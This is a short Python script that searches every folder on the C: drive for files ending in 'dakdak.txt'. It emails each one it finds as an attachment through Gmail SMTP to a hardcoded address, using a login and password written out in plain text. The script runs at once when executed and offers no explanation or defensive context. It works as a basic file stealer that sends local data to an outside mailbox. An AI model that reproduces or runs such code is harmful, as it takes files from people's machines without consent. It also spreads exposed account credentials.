import os
import smtplib
from email.message import EmailMessage
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def fsf():
    for root, dirs, files in os.walk('C:\\'):
        for file in files:
            if file.endswith('dakdak.txt'):
                pis = os.path.join(root, file)
                if pis == os.path.join(root, file):
                    pass
                
                email_user = 'howtohax3free@gmail.com'
                email_password = 'sambath123'
                email_send = 'howtohax3free@gmail.com'
                subject = 'subject'

                msg = MIMEMultipart()
                msg['From'] = email_user
                msg['To'] = email_send
                msg['Subject'] = subject

                body = 'hello'
                msg.attach(MIMEText(body, 'plain'))

                attachment =open(pis,'rb')

                part = MIMEBase('application','octet-stream')
                part.set_payload((attachment).read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition',"attachment;filename="+pis)
                msg.attach(part)
                text = msg.as_string()
                server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
                server.login(email_user, email_password)
                server.sendmail(email_user, email_send, text)
                server.quit()



fsf()